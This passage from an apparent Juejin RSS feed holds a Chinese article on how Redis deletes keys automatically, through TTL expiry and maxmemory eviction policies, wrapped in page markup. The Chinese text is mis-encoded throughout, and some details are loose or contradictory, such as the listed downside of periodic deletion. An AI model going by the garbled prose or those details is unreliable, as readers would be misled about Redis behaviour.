itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘å¼€å‘è€…é±¼å¼¦"/> <meta itemprop="url" content="https://juejin.cn/user/3142872843957161"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            redis ä»€ä¹ˆæƒ…å†µä¼šè‡ªåŠ¨åˆ é™¤key
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3142872843957161/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘å¼€å‘è€…é±¼å¼¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:18:23.000Z" title="Tue Dec 09 2025 09:18:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Redis ä¸­ï¼Œ<strong>key çš„è‡ªåŠ¨åˆ é™¤</strong>ä¸»è¦ç”±ä¸¤ç§æ ¸å¿ƒæœºåˆ¶è§¦å‘ï¼š<strong>è¿‡æœŸåˆ é™¤ï¼ˆé’ˆå¯¹è®¾ç½®äº† TTL çš„ keyï¼‰</strong> â€‹ å’Œ <strong>å†…å­˜æ·˜æ±°ï¼ˆé’ˆå¯¹å†…å­˜è¶…é™æ—¶çš„ keyï¼‰</strong> ã€‚ä»¥ä¸‹æ˜¯å…·ä½“åœºæ™¯ã€ç­–ç•¥åŠåŸç†çš„è¯¦ç»†è¯´æ˜ï¼š</p>
<h3 data-id="heading-0"><strong>ä¸€ã€è¿‡æœŸåˆ é™¤ï¼šKey è¾¾åˆ°é¢„è®¾ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰åè‡ªåŠ¨åˆ é™¤</strong>â€‹</h3>
<p>Redis æ”¯æŒä¸º key è®¾ç½®<strong>è¿‡æœŸæ—¶é—´ï¼ˆTime To Live, TTLï¼‰</strong> ï¼Œå½“ key çš„å­˜æ´»æ—¶é—´è¶…è¿‡ TTL æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚è¿™æ˜¯æœ€å¸¸è§çš„â€œè‡ªåŠ¨åˆ é™¤â€åœºæ™¯ã€‚</p>
<h4 data-id="heading-1"><strong>1. å¦‚ä½•è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Ÿ</strong> â€‹</h4>
<p>é€šè¿‡ä»¥ä¸‹å‘½ä»¤ä¸º key è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆå•ä½ï¼šç§’/æ¯«ç§’ï¼‰ï¼š</p>
<ul>
<li><code>EXPIRE key seconds</code>ï¼šè®¾ç½® key åœ¨ <code>seconds</code>ç§’åè¿‡æœŸï¼ˆå¦‚ <code>EXPIRE user:100 3600</code>è¡¨ç¤º 1 å°æ—¶åè¿‡æœŸï¼‰ã€‚</li>
<li><code>PEXPIRE key milliseconds</code>ï¼šè®¾ç½® key åœ¨ <code>milliseconds</code>æ¯«ç§’åè¿‡æœŸï¼ˆå¦‚ <code>PEXPIRE session:abc 1800000</code>è¡¨ç¤º 30 åˆ†é’Ÿåè¿‡æœŸï¼‰ã€‚</li>
<li><code>SET key value EX seconds</code>ï¼šåˆ›å»º key æ—¶ç›´æ¥æŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆå¦‚ <code>SET name "Alice" EX 60</code>è¡¨ç¤º 60 ç§’åè¿‡æœŸï¼‰ã€‚</li>
<li><code>EXPIREAT key timestamp</code>ï¼šè®¾ç½® key åœ¨æŸä¸ª Unix æ—¶é—´æˆ³ï¼ˆç§’ï¼‰è¿‡æœŸï¼ˆå¦‚ <code>EXPIREAT order:2024 1717171200</code>è¡¨ç¤º 2024-06-01 00:00:00 è¿‡æœŸï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-2"><strong>2. è¿‡æœŸåˆ é™¤çš„è§¦å‘ç­–ç•¥ï¼ˆæ ¸å¿ƒï¼ï¼‰</strong> â€‹</h4>
<p>Redis å¹¶éå®æ—¶æ‰«æå¹¶åˆ é™¤æ‰€æœ‰è¿‡æœŸ keyï¼ˆé¿å… CPU èµ„æºæµªè´¹ï¼‰ï¼Œè€Œæ˜¯é€šè¿‡ <strong>â€œæƒ°æ€§åˆ é™¤ + å®šæœŸåˆ é™¤â€</strong> â€‹ ç»“åˆçš„æ··åˆç­–ç•¥ï¼š</p>
<h5 data-id="heading-3"><strong>â‘  æƒ°æ€§åˆ é™¤ï¼ˆLazy Expirationï¼‰</strong> â€‹</h5>
<ul>
<li>
<p><strong>è§¦å‘æ—¶æœº</strong>ï¼šå½“å®¢æˆ·ç«¯<strong>è®¿é—®æŸä¸ª key</strong>â€‹ æ—¶ï¼ŒRedis ä¼šå…ˆæ£€æŸ¥è¯¥ key æ˜¯å¦å·²è¿‡æœŸã€‚</p>
</li>
<li>
<p><strong>å¤„ç†é€»è¾‘</strong>ï¼š</p>
<ul>
<li>è‹¥ key å·²è¿‡æœŸï¼šç«‹å³åˆ é™¤è¯¥ keyï¼Œå¹¶è¿”å› <code>nil</code>ï¼ˆè¡¨ç¤º key ä¸å­˜åœ¨ï¼‰ï¼›</li>
<li>è‹¥ key æœªè¿‡æœŸï¼šæ­£å¸¸è¿”å›å€¼ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šå¯¹ CPU å‹å¥½ï¼ˆä»…åœ¨è®¿é—®æ—¶æ£€æŸ¥ï¼‰ï¼Œä¸å½±å“å…¶ä»–æ“ä½œï¼›</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šè‹¥è¿‡æœŸ key é•¿æœŸä¸è¢«è®¿é—®ï¼Œä¼šä¸€ç›´å ç”¨å†…å­˜ï¼ˆâ€œå†…å­˜æ³„æ¼â€é£é™©ï¼‰ã€‚</p>
</li>
</ul>
<h5 data-id="heading-4"><strong>â‘¡ å®šæœŸåˆ é™¤ï¼ˆPeriodic Expirationï¼‰</strong> â€‹</h5>
<ul>
<li>
<p><strong>è§¦å‘æ—¶æœº</strong>ï¼šRedis æ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆé»˜è®¤ <strong>100ms</strong>ï¼Œå¯é€šè¿‡ <code>hz</code>é…ç½®è°ƒæ•´ï¼ŒèŒƒå›´ 1-500ï¼‰ï¼Œä¸»åŠ¨éšæœºæŠ½å–éƒ¨åˆ†è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„ key è¿›è¡Œæ£€æŸ¥ã€‚</p>
</li>
<li>
<p><strong>å¤„ç†é€»è¾‘</strong>ï¼š</p>
<ul>
<li>ä»è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„ key ä¸­éšæœºé€‰å– <strong>20 ä¸ª</strong>ï¼ˆé»˜è®¤å€¼ï¼Œå¯é€šè¿‡ <code>active-expire-effort</code>è°ƒæ•´ï¼‰è¿›è¡Œæ£€æŸ¥ï¼›</li>
<li>åˆ é™¤å…¶ä¸­å·²è¿‡æœŸçš„ keyï¼›</li>
<li>è‹¥æœ¬è½®æ£€æŸ¥ä¸­ï¼Œè¶…è¿‡ <strong>25% çš„ key å·²è¿‡æœŸ</strong>ï¼ˆè¯´æ˜è¿‡æœŸ key è¾ƒå¤šï¼‰ï¼Œåˆ™é‡å¤ä¸Šè¿°æ­¥éª¤ï¼ˆæœ€å¤šå¾ªç¯ 10 æ¬¡ï¼Œé¿å…é˜»å¡ä¸»çº¿ç¨‹ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šä¸»åŠ¨é‡Šæ”¾éƒ¨åˆ†è¿‡æœŸ key å†…å­˜ï¼Œå¼¥è¡¥æƒ°æ€§åˆ é™¤çš„ä¸è¶³ï¼›</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šåˆ é™¤é¢‘ç‡å’Œå½±å“èŒƒå›´å¯æ§ï¼ˆé¿å… CPU å ç”¨è¿‡é«˜ï¼‰ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5"><strong>3. è¿‡æœŸåˆ é™¤çš„æ³¨æ„äº‹é¡¹</strong>â€‹</h4>
<ul>
<li><strong>è¿‡æœŸç²¾åº¦</strong>ï¼šRedis çš„è¿‡æœŸæ—¶é—´æ˜¯â€œè¿‘ä¼¼ç²¾ç¡®â€çš„ï¼ˆè¯¯å·®é€šå¸¸åœ¨æ¯«ç§’çº§ï¼‰ï¼Œå—å®šæœŸåˆ é™¤çš„é¢‘ç‡å½±å“ï¼Œæç«¯æƒ…å†µä¸‹å¯èƒ½å»¶è¿Ÿå‡ ç§’åˆ é™¤ã€‚</li>
<li><strong>æ°¸ä¸è¿‡æœŸçš„ key</strong>ï¼šè‹¥æœªè®¾ç½® TTLï¼ˆæˆ– TTL ä¸º <code>-1</code>ï¼‰ï¼Œkey ä¸ä¼šè‡ªåŠ¨åˆ é™¤ï¼ˆé™¤éè¢«å†…å­˜æ·˜æ±°ï¼‰ã€‚</li>
<li><strong>å–æ¶ˆè¿‡æœŸæ—¶é—´</strong>ï¼šé€šè¿‡ <code>PERSIST key</code>å‘½ä»¤å¯ç§»é™¤ key çš„è¿‡æœŸæ—¶é—´ï¼Œä½¿å…¶æ°¸ä¹…æœ‰æ•ˆã€‚</li>
</ul>
<h3 data-id="heading-6"><strong>äºŒã€å†…å­˜æ·˜æ±°ï¼šå†…å­˜ä½¿ç”¨è¾¾åˆ°ä¸Šé™æ—¶è‡ªåŠ¨åˆ é™¤ Key</strong>â€‹</h3>
<p>å½“ Redis çš„å†…å­˜ä½¿ç”¨é‡è¾¾åˆ° <code>maxmemory</code>é…ç½®çš„ä¸Šé™æ—¶ï¼ˆé»˜è®¤æ— é™åˆ¶ï¼Œéœ€æ‰‹åŠ¨é…ç½®ï¼‰ï¼Œä¼šè§¦å‘ <strong>å†…å­˜æ·˜æ±°æœºåˆ¶</strong>ï¼Œæ ¹æ®é¢„è®¾ç­–ç•¥è‡ªåŠ¨åˆ é™¤éƒ¨åˆ† key ä»¥é‡Šæ”¾å†…å­˜ã€‚</p>
<h4 data-id="heading-7">**1. æ ¸å¿ƒé…ç½®ï¼š<code>maxmemory</code>ä¸ <code>maxmemory-policy</code>**â€‹</h4>
<ul>
<li><strong><code>maxmemory &lt;bytes&gt;</code></strong> ï¼šè®¾ç½® Redis æœ€å¤§å¯ç”¨å†…å­˜ï¼ˆå¦‚ <code>maxmemory 4gb</code>è¡¨ç¤ºæœ€å¤§ä½¿ç”¨ 4GB å†…å­˜ï¼‰ã€‚</li>
<li><strong><code>maxmemory-policy &lt;policy&gt;</code></strong> ï¼šè®¾ç½®å†…å­˜æ·˜æ±°ç­–ç•¥ï¼ˆå†³å®šåˆ é™¤å“ªäº› keyï¼‰ï¼Œé»˜è®¤ç­–ç•¥ä¸º <code>noeviction</code>ï¼ˆä¸æ·˜æ±°ï¼Œç›´æ¥è¿”å›é”™è¯¯ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-8"><strong>2. å†…å­˜æ·˜æ±°ç­–ç•¥ï¼ˆ7 ç§å¯é€‰ï¼‰</strong> â€‹</h4>
<p>æ ¹æ® key æ˜¯å¦è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œåˆ†ä¸ºä¸¤ç±»ç­–ç•¥ï¼š</p>
<h5 data-id="heading-9"><strong>â‘  é’ˆå¯¹â€œå·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„ keyâ€çš„ç­–ç•¥</strong>â€‹</h5>
<ul>
<li><strong><code>volatile-lru</code></strong>ï¼ˆé»˜è®¤æ¨èï¼‰ï¼šä»<strong>å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„ key</strong>â€‹ ä¸­ï¼Œåˆ é™¤<strong>æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLRUï¼‰</strong> â€‹ çš„ keyã€‚</li>
<li><strong><code>volatile-lfu</code></strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„ key ä¸­ï¼Œåˆ é™¤<strong>æœ€è¿‘æœ€ä¸é¢‘ç¹ä½¿ç”¨ï¼ˆLFUï¼‰</strong> â€‹ çš„ keyï¼ˆRedis 4.0+ æ”¯æŒï¼‰ã€‚</li>
<li><strong><code>volatile-ttl</code></strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„ key ä¸­ï¼Œåˆ é™¤<strong>å‰©ä½™ TTL æœ€çŸ­</strong>â€‹ çš„ keyï¼ˆå³å°†è¿‡æœŸçš„ä¼˜å…ˆåˆ ï¼‰ã€‚</li>
<li><strong><code>volatile-random</code></strong>ï¼šä»å·²è®¾ç½®è¿‡æœŸæ—¶é—´çš„ key ä¸­ï¼Œ<strong>éšæœºåˆ é™¤</strong>â€‹ ä¸€ä¸ª keyã€‚</li>
</ul>
<h5 data-id="heading-10"><strong>â‘¡ é’ˆå¯¹â€œæ‰€æœ‰ keyâ€çš„ç­–ç•¥</strong>â€‹</h5>
<ul>
<li><strong><code>allkeys-lru</code></strong>ï¼šä»<strong>æ‰€æœ‰ key</strong>â€‹ ä¸­ï¼Œåˆ é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLRUï¼‰çš„ keyï¼ˆé€‚åˆç¼“å­˜åœºæ™¯ï¼Œä¿ç•™çƒ­ç‚¹æ•°æ®ï¼‰ã€‚</li>
<li><strong><code>allkeys-lfu</code></strong>ï¼šä»æ‰€æœ‰ key ä¸­ï¼Œåˆ é™¤æœ€è¿‘æœ€ä¸é¢‘ç¹ä½¿ç”¨ï¼ˆLFUï¼‰çš„ keyï¼ˆRedis 4.0+ æ”¯æŒï¼‰ã€‚</li>
<li><strong><code>allkeys-random</code></strong>ï¼šä»æ‰€æœ‰ key ä¸­ï¼Œéšæœºåˆ é™¤ä¸€ä¸ª keyã€‚</li>
</ul>
<h5 data-id="heading-11"><strong>â‘¢ ä¸æ·˜æ±°ç­–ç•¥</strong>â€‹</h5>
<ul>
<li><strong><code>noeviction</code></strong>ï¼šå†…å­˜è¶…é™æ—¶ï¼Œä¸åˆ é™¤ keyï¼Œç›´æ¥è¿”å› <code>OOM command not allowed when used memory &gt; 'maxmemory'</code>é”™è¯¯ï¼ˆé»˜è®¤ç­–ç•¥ï¼Œéœ€è°¨æ…ä½¿ç”¨ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-12"><strong>3. å†…å­˜æ·˜æ±°çš„è§¦å‘æµç¨‹</strong>â€‹</h4>
<ol>
<li>å½“ Redis æ‰§è¡Œå†™æ“ä½œï¼ˆå¦‚ <code>SET</code>ã€<code>LPUSH</code>ï¼‰æ—¶ï¼Œæ£€æŸ¥å†…å­˜ä½¿ç”¨æ˜¯å¦è¶…è¿‡ <code>maxmemory</code>ï¼›</li>
<li>è‹¥è¶…è¿‡ï¼Œæ ¹æ® <code>maxmemory-policy</code>é€‰æ‹©å¾…åˆ é™¤çš„ keyï¼›</li>
<li>åˆ é™¤ key åï¼Œè‹¥å†…å­˜ä»è¶…é™ï¼Œé‡å¤æ­¥éª¤ 2ï¼ˆç›´åˆ°å†…å­˜è¶³å¤Ÿæˆ–è§¦å‘ <code>noeviction</code>é”™è¯¯ï¼‰ã€‚</li>
</ol>
<h4 data-id="heading-13"><strong>4. å†…å­˜æ·˜æ±°çš„æ³¨æ„äº‹é¡¹</strong>â€‹</h4>
<ul>
<li><strong>LRU/LFU è¿‘ä¼¼ç®—æ³•</strong>ï¼šRedis å¹¶æœªå®ç°ä¸¥æ ¼çš„ LRU/LFUï¼ˆé¿å…éå†æ‰€æœ‰ key è€—æ—¶ï¼‰ï¼Œè€Œæ˜¯é€šè¿‡<strong>éšæœºé‡‡æ ·</strong>ï¼ˆé»˜è®¤ 5 ä¸ª keyï¼Œå¯é€šè¿‡ <code>maxmemory-samples</code>è°ƒæ•´ï¼‰ä¼°ç®—æœ€è¿‘ä½¿ç”¨æƒ…å†µï¼Œå¹³è¡¡ç²¾åº¦ä¸æ€§èƒ½ã€‚</li>
<li><strong>æŒä¹…åŒ–å½±å“</strong>ï¼šå†…å­˜æ·˜æ±°ä»…åˆ é™¤å†…å­˜ä¸­çš„ keyï¼Œè‹¥ key å·²æŒä¹…åŒ–åˆ° RDB/AOF æ–‡ä»¶ï¼Œé‡å¯åä»ä¼šåŠ è½½ï¼ˆéœ€ç»“åˆæŒä¹…åŒ–ç­–ç•¥ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-14"><strong>ä¸‰ã€å…¶ä»–è‡ªåŠ¨åˆ é™¤åœºæ™¯ï¼ˆç½•è§ï¼‰</strong> â€‹</h3>
<h4 data-id="heading-15">**1. ä¸»åŠ¨è§¦å‘ <code>FLUSHDB</code>/<code>FLUSHALL</code>**â€‹</h4>
<ul>
<li><code>FLUSHDB</code>ï¼šåˆ é™¤å½“å‰æ•°æ®åº“çš„æ‰€æœ‰ keyï¼ˆéœ€è°¨æ…ï¼Œä¸å¯é€†ï¼‰ï¼›</li>
<li><code>FLUSHALL</code>ï¼šåˆ é™¤æ‰€æœ‰æ•°æ®åº“çš„ keyã€‚ è¿™ä¸¤ä¸ªå‘½ä»¤æ˜¯<strong>æ‰‹åŠ¨è§¦å‘</strong>çš„â€œæ‰¹é‡åˆ é™¤â€ï¼Œä¸å±äºâ€œè‡ªåŠ¨åˆ é™¤â€ï¼Œä½†å¯èƒ½è¢«è¯¯é…ç½®ä¸ºå®šæ—¶ä»»åŠ¡ï¼ˆå¦‚ cron è„šæœ¬ï¼‰å¯¼è‡´ key è¢«è‡ªåŠ¨æ¸…é™¤ã€‚</li>
</ul>
<h4 data-id="heading-16"><strong>2. é›†ç¾¤æ¨¡å¼ä¸‹ Slot è¿ç§»</strong>â€‹</h4>
<p>åœ¨ Redis Cluster ä¸­ï¼Œå½“æ§½ä½ï¼ˆSlotï¼‰ä»ä¸€ä¸ªèŠ‚ç‚¹è¿ç§»åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹æ—¶ï¼ŒæºèŠ‚ç‚¹ä¼šè‡ªåŠ¨åˆ é™¤å·²è¿ç§»çš„ keyï¼ˆç›®æ ‡èŠ‚ç‚¹ä¼šæ–°å¢ keyï¼‰ã€‚è¿™å±äºé›†ç¾¤å†…éƒ¨çš„è‡ªåŠ¨æ•°æ®åŒæ­¥ï¼Œéç”¨æˆ·æ„ŸçŸ¥çš„â€œåˆ é™¤â€ã€‚</p>
<h3 data-id="heading-17"><strong>æ€»ç»“ï¼šRedis è‡ªåŠ¨åˆ é™¤ Key çš„æ ¸å¿ƒåœºæ™¯</strong>â€‹</h3>























<table><thead><tr><th><strong>è§¦å‘ç±»å‹</strong>â€‹</th><th><strong>æ ¸å¿ƒæ¡ä»¶</strong>â€‹</th><th><strong>ç­–ç•¥/æœºåˆ¶</strong>â€‹</th><th><strong>å…¸å‹åœºæ™¯</strong>â€‹</th></tr></thead><tbody><tr><td><strong>è¿‡æœŸåˆ é™¤</strong>â€‹</td><td>Key çš„ TTL åˆ°æœŸ</td><td>æƒ°æ€§åˆ é™¤ï¼ˆè®¿é—®æ—¶æ£€æŸ¥ï¼‰+ å®šæœŸåˆ é™¤ï¼ˆéšæœºæŠ½æŸ¥ï¼‰</td><td>éªŒè¯ç ï¼ˆ5 åˆ†é’Ÿè¿‡æœŸï¼‰ã€ä¼šè¯ Tokenï¼ˆ30 åˆ†é’Ÿè¿‡æœŸï¼‰</td></tr><tr><td><strong>å†…å­˜æ·˜æ±°</strong>â€‹</td><td>å†…å­˜ä½¿ç”¨è¾¾åˆ° <code>maxmemory</code>ä¸Šé™</td><td>æŒ‰ <code>maxmemory-policy</code>åˆ é™¤ï¼ˆLRU/LFU/TTL/éšæœºï¼‰</td><td>ç¼“å­˜æœåŠ¡å™¨å†…å­˜ä¸è¶³æ—¶ï¼Œåˆ é™¤å†·æ•°æ®é‡Šæ”¾ç©ºé—´</td></tr></tbody></table>
<h3 data-id="heading-18"><strong>é…ç½®å»ºè®®</strong>â€‹</h3>
<ul>
<li><strong>è¿‡æœŸåˆ é™¤</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚åˆç†è®¾ç½® TTLï¼ˆå¦‚ç¼“å­˜æ•°æ®è®¾çŸ­æœŸ TTLï¼Œæ°¸ä¹…æ•°æ®ä¸è®¾ TTLï¼‰ï¼›</li>
<li><strong>å†…å­˜æ·˜æ±°</strong>ï¼šç¼“å­˜åœºæ™¯æ¨è <code>allkeys-lru</code>ï¼ˆä¿ç•™çƒ­ç‚¹æ•°æ®ï¼‰ï¼ŒæŒä¹…åŒ–æ•°æ®åœºæ™¯æ¨è <code>volatile-lru</code>ï¼ˆä»…åˆ é™¤ä¸´æ—¶æ•°æ®ï¼‰ï¼›</li>
<li><strong>ç›‘æ§</strong>ï¼šé€šè¿‡ <code>INFO stats</code>å‘½ä»¤æŸ¥çœ‹ <code>expired_keys</code>ï¼ˆè¿‡æœŸåˆ é™¤çš„ key æ€»æ•°ï¼‰å’Œ <code>evicted_keys</code>ï¼ˆå†…å­˜æ·˜æ±°çš„ key æ€»æ•°ï¼‰ï¼Œè¯„ä¼°è‡ªåŠ¨åˆ é™¤æ•ˆæœã€‚</li>
</ul>
<p>é€šè¿‡è¿™ä¸¤ç§æœºåˆ¶ï¼ŒRedis å®ç°äº†â€œè‡ªåŠ¨ç®¡ç† key ç”Ÿå‘½å‘¨æœŸâ€çš„èƒ½åŠ›ï¼Œæ—¢ä¿è¯äº†å†…å­˜æ•ˆç‡ï¼Œåˆé¿å…äº†æ‰‹åŠ¨ç»´æŠ¤çš„ç¹çã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€JavaSEã€‘IOé›†åˆå…¨é¢æ¢³ç†ä¸æ ¸å¿ƒæ“ä½œè¯¦è§£]]></title>    <link>https://juejin.cn/post/7581428845683834923</link>    <guid>https://juejin.cn/post/7581428845683834923</guid>    <pubDate>2025-12-09T09:23:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581428845683834923" data-draft-id="7581413562487177222" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€JavaSEã€‘IOé›†åˆå…¨é¢æ¢³ç†ä¸æ ¸å¿ƒæ“ä½œè¯¦è§£"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T09:23:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CyberShen"/> <meta itemprop="url" content="https://juejin.cn/user/554609587530014"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€JavaSEã€‘IOé›†åˆå…¨é¢æ¢³ç†ä¸æ ¸å¿ƒæ“ä½œè¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/554609587530014/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CyberShen
